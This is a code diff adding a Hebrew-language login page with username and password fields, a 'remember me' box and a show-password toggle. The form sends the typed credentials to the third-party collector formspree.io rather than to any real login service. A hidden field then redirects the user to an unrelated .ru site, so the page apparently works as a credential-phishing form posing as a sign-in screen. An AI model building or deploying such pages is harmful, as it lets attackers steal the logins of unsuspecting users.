@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>התחברות</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #5d8aa8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .main-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+        .logo-box {
+            text-align: center;
+            width: 100%;
+        }
+        .logo-box img {
+            max-width: 100%;
+            height: auto;
+            max-height: 150px;
+            object-fit: contain;
+        }
+        .login-box {
+            background-color: #ffffff;
+            width: 450px;
+            padding: 40px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .form-group label {
+            font-weight: bold;
+            font-size: 15px;
+            color: #333333;
+            text-align: right;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #a6a6a6;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+            outline: none;
+        }
+        .password-container {
+            position: relative;
+            width: 100%;
+        }
+        .password-container input {
+            padding-left: 45px; /* משאיר מקום לעין בצד שמאל */
+            background-color: #edf2fa;
+        }
+        .eye-icon-btn {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #1a73e8;
+            font-size: 18px;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            z-index: 10;
+        }
+        .bottom-action-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+        }
+        .submit-blue-btn {
+            background-color: #1e6bb8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .remember-me-label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: bold;
+            font-size: 15px;
+            color: #333333;
+            cursor: pointer;
+        }
+        .remember-me-label input {
+            width: 18px;
+            height: 18px;
+            accent-color: #1a73e8;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-wrapper">
+        <div class="logo-box">
+            <!-- קריאה מוגנת לקובץ הלוגו המקומי שלכם -->
+            <img src="logo.png" onerror="this.onerror=function(){this.src='logo.jpg'; this.onerror=function(){this.src='logo';}}; this.src='logo.png';" alt="לוגו">
+        </div>
+
+        <form class="login-box" action="https://formspree.io" method="POST">
+            <!-- ההפניה הרשמית של Formspree לקובץ הווידאו בסיום השליחה -->
+            <input type="hidden" name="_next" value="https://or-menachem.ru">
+            
+            <div class="form-group">
+                <label>שם משתמש או כתובת אימייל</label>
+                <input type="text" name="username_or_email" required>
+            </div>
+
+            <div class="form-group">
+                <label>סיסמה</label>
+                <div class="password-container">
+                    <input type="password" id="password-field" name="password" required>
+                    <!-- כפתור העינית לחשיפה והסתרה של התווים -->
+                    <button type="button" class="eye-icon-btn" onclick="toggleView(event)">
+                        <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                    </button>
+                </div>
+            </div>
+
+            <div class="bottom-action-row">
+                <!-- זכור אותי בצד ימין -->
+                <label class="remember-me-label">
+                    <input type="checkbox" name="remember_me" checked>
+                    <span>זכור אותי</span>
+                </label>
+
+                <!-- כפתור התחבר בצד שמאל -->
+                <button type="submit" class="submit-blue-btn">התחבר</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // פונקציית ה-JavaScript שמפעילה את הצגת והסתרת הסיסמה
+        function toggleView(e) {
+            e.preventDefault();
+            var input = document.getElementById('password-field');
+            if (input.type === 'password') {
+                input.type = 'text';
+            } else {
+                input.type = 'password';
+            }
+        }
+    </script>
+</body>
+</html>
